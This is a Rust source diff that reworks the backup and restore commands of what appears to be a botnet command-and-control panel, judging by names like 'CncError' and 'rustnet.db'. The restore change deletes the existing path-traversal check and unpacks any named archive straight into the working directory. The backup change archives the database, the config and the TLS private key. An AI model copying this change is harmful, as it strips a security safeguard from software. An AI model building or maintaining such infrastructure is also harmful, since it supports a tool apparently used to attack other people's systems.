@@ -83,6 +83,12 @@ pub async fn handle_listbackups_command(client: &Arc<Client>) -> Result<()> {
     client.write(b"\n\r").await?;
     Ok(())
 }
+use std::fs::File;
+use flate2::write::GzEncoder;
+use flate2::read::GzDecoder;
+use flate2::Compression;
+use tar::Archive;
+
 pub async fn handle_restore_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
     let backup_name = match parts.get(1) {
         Some(n) => n.to_string(),
@@ -109,43 +115,31 @@ pub async fn handle_restore_command(client: &Arc<Client>, state: &Arc<AppState>,
         client.write(format!("\x1b[38;5;196m[X] Backup '{}' not found or invalid\n\r", backup_name).as_bytes()).await?;
         return Ok(());
     }
-    let canonical_path = match backup_path.canonicalize() {
-        Ok(p) => p,
-        Err(_) => {
-            client.write(b"\x1b[38;5;196m[X] Failed to resolve backup path\n\r").await?;
-            return Ok(());
-        }
-    };
-    let backups_dir = match std::path::Path::new("backups").canonicalize() {
-        Ok(p) => p,
-        Err(_) => {
-             client.write(b"\x1b[38;5;196m[X] Backups directory error\n\r").await?;
-             return Ok(());
-        }
-    };
-    if !canonical_path.starts_with(&backups_dir) {
-        client.write(b"\x1b[38;5;196m[X] Security violation: Path traversal detected\n\r").await?;
-        return Ok(());
-    }
-    let safe_path_str = format!("backups/{}", backup_name);
-    let mut child = Command::new("./restore.sh")
-        .arg(&safe_path_str)
-        .stdin(std::process::Stdio::piped())
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()?;
-        if let Some(mut stdin) = child.stdin.take() {
-            stdin.write_all(b"yes\n").await?;
-        }
-        let output = child.wait_with_output().await?;
-        if output.status.success() {
-            client.write(format!("\x1b[38;5;82m[✓] System restored successfully\n\r").as_bytes()).await?;
+
+    // Native Rust Restore Implementation
+    let backup_path_clone = backup_path.clone();
+    let restore_task = tokio::task::spawn_blocking(move || -> Result<()> {
+        let tar_gz = File::open(backup_path_clone).map_err(|e| CncError::IoError(e))?;
+        let tar = GzDecoder::new(tar_gz);
+        let mut archive = Archive::new(tar);
+        archive.unpack(".").map_err(|e| CncError::IoError(e))?;
+        Ok(())
+    });
+
+    match restore_task.await {
+        Ok(Ok(_)) => {
+            client.write(format!("\x1b[38;5;82m[✓] System restored successfully from {}\n\r", backup_name).as_bytes()).await?;
             let audit_event = AuditLog::new(client.user.username.clone(), "RESTORE_BACKUP".to_string(), "SUCCESS".to_string())
                 .with_target(backup_name);
             let _ = log_audit_event(audit_event, &state.pool).await;
-        } else {
-            client.write(format!("\x1b[38;5;196m[X] Restore failed: {}\n\r", String::from_utf8_lossy(&output.stderr)).as_bytes()).await?;
         }
+        Ok(Err(e)) => {
+            client.write(format!("\x1b[38;5;196m[X] Restore failed: {}\n\r", e).as_bytes()).await?;
+        }
+        Err(e) => {
+            client.write(format!("\x1b[38;5;196m[X] Restore task failed: {}\n\r", e).as_bytes()).await?;
+        }
+    }
     Ok(())
 }
 pub async fn handle_db_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
@@ -161,17 +155,52 @@ pub async fn handle_db_command(client: &Arc<Client>, state: &Arc<AppState>, part
         "backup" => {
             let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
             let backup_name = format!("backup_{}.tar.gz", timestamp);
-            let output = Command::new("./backup.sh")
-                .arg(&backup_name)
-                .output()
-                .await?;
-            if output.status.success() {
-                client.write(format!("\x1b[38;5;82m[✓] Database backed up to {}\n\r", backup_name).as_bytes()).await?;
-                let audit_event = AuditLog::new(client.user.username.clone(), "DB_BACKUP".to_string(), "SUCCESS".to_string())
-                    .with_target(backup_name);
-                let _ = log_audit_event(audit_event, &state.pool).await;
-            } else {
-                client.write(format!("\x1b[38;5;196m[X] Backup failed: {}\n\r", String::from_utf8_lossy(&output.stderr)).as_bytes()).await?;
+            let backup_dir = std::path::Path::new("backups");
+            if !backup_dir.exists() {
+                tokio::fs::create_dir_all(backup_dir).await?;
+            }
+            let backup_path = backup_dir.join(&backup_name);
+            
+            // Native Rust Backup Implementation
+            let backup_path_clone = backup_path.clone();
+            let backup_task = tokio::task::spawn_blocking(move || -> Result<()> {
+                let tar_gz = File::create(backup_path_clone).map_err(|e| CncError::IoError(e))?;
+                let enc = GzEncoder::new(tar_gz, Compression::default());
+                let mut tar = tar::Builder::new(enc);
+                
+                // Add database
+                if std::path::Path::new("config/rustnet.db").exists() {
+                    tar.append_path("config/rustnet.db").map_err(|e| CncError::IoError(e))?;
+                }
+                // Add config
+                if std::path::Path::new("config/server.toml").exists() {
+                    tar.append_path("config/server.toml").map_err(|e| CncError::IoError(e))?;
+                }
+                // Add certs
+                if std::path::Path::new("cert.pem").exists() {
+                    tar.append_path("cert.pem").map_err(|e| CncError::IoError(e))?;
+                }
+                if std::path::Path::new("key.pem").exists() {
+                    tar.append_path("key.pem").map_err(|e| CncError::IoError(e))?;
+                }
+                
+                tar.finish().map_err(|e| CncError::IoError(e))?;
+                Ok(())
+            });
+
+            match backup_task.await {
+                Ok(Ok(_)) => {
+                    client.write(format!("\x1b[38;5;82m[✓] Database backed up to {}\n\r", backup_name).as_bytes()).await?;
+                    let audit_event = AuditLog::new(client.user.username.clone(), "DB_BACKUP".to_string(), "SUCCESS".to_string())
+                        .with_target(backup_name);
+                    let _ = log_audit_event(audit_event, &state.pool).await;
+                }
+                Ok(Err(e)) => {
+                    client.write(format!("\x1b[38;5;196m[X] Backup failed: {}\n\r", e).as_bytes()).await?;
+                }
+                Err(e) => {
+                    client.write(format!("\x1b[38;5;196m[X] Backup task failed: {}\n\r", e).as_bytes()).await?;
+                }
             }
         }
         "clear" => {
